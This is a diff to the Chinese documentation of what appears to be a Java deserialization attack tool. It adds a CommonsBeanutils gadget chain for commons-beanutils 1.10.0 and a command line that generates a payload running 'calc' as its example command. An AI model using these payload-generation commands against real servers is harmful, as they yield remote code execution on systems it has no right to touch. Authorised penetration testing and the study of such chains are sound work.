@@ -461,6 +461,7 @@ CommonsBeanutils利用链很常见但是比较麻烦的是，CB依赖版本不�
 |CommonsBeanutils2_183|commons-logging，commons-beanutils:1.8.3|-3490850999041592962L|1.7 和 1.8 类的BeanComparator类suid都一样|
 |CommonsBeanutils2_16|commons-logging，commons-beanutils:1.6|2573799559215537819L|1.6 系列的BeanComparator类suid都一样|
 |CommonsBeanutils2_15|commons-logging，commons-beanutils:1.5|5123381023979609048L|1.5 系列的BeanComparator类suid都一样|
+|CommonsBeanutils2_110|commons-logging，commons-beanutils:1.10.0|1L|1.10系列的BeanComparator类suid都一样|
 
 ##### CommonsBeanutils2(1.9.2)
 
@@ -484,6 +485,12 @@ CommonsBeanutils利用链很常见但是比较麻烦的是，CB依赖版本不�
 
 ```bash
 -m YsoAttack -g CommonsBeanutils2_15 -a "Templateslmpl:auto_cmd:calc"
+```
+
+##### CommonsBeanutils2_110(1.10.0)
+
+```
+-m YsoAttack -g CommonsBeanutils2_110 -a "Templateslmpl:auto_cmd:calc"
 ```
 
 #### CommonsCollections3.2.1系列
